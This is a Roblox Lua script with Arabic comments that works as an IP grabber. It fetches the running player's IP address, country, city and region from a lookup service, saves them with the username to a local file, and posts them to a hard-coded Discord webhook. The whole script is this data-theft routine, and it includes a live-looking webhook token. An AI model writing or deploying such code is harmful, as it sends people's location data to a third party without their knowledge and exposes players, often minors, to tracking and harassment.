local httpserver = game:GetService("HttpService")
local plr = GetService("Players").LocalPlayer or game:GetService("Players").PlayerAdded:Wait()

-- جلب معلومات الـ IP
local res = httpserver:RequestAsync({
    Url = "https://ipwho.is/",
    Method = "GET",
    Headers = {
      ["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
    }
})

local data67 = httpserver:JSONDecode(res.Body)
local data = {
  ip = data67.ip or "Unknown",
  country = data67.country or "Unknown",
  city = data67.city or "Unknown",
  region = data67.region or "Unknown"
}

-- تجهيز النص وحفظه محلياً في الملف
local fileContent = string.format("UserName : %s\nIP Player: %s\nCountry: %s\nCity: %s\nRegion: %s", 
    plr.Name, data.ip, data.country, data.city, data.region)

writefile("info.txt", fileContent)

local read67ftile = readfile("info.txt")
print(read67ftile)

-- رابط الوايب هوك الخاص بك
local webhookUrl = "https://discord.com/api/webhooks/1348549570064224398/-komilk4yZho8POMaB_4TKlHQKYoKUsEACDNtTF96cjqD6qOD9eljlxtDDkxoedBvV9B"

-- تصميم رسالة ديسكورد مرتبة داخل (شفرة / Code Block) لعرض البيانات بوضوح
local embedData = {
    content = "```json\n" .. read67ftile .. "\n```"
}

-- إرسال البيانات إلى الوايب هوك
httpserver:PostAsync(webhookUrl, httpserver:JSONEncode(embedData))
